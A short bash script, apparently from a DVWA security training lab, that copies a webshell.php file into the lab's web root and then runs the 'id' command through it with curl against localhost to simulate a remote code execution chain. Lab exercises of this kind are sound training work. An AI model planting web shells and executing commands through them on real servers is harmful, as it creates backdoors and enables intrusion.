#!/bin/bash

# Note: Adjust WEBROOT path based on your DVWA volume mount
WEBROOT="../dvwa/html"

echo "[*] Dropping webshell..."
mkdir -p "$WEBROOT"
cp webshell.php "$WEBROOT/webshell.php"

echo "[*] Executing command through webshell..."
curl -s "http://localhost:8081/webshell.php?cmd=id"

echo "[+] RCE chain simulated."
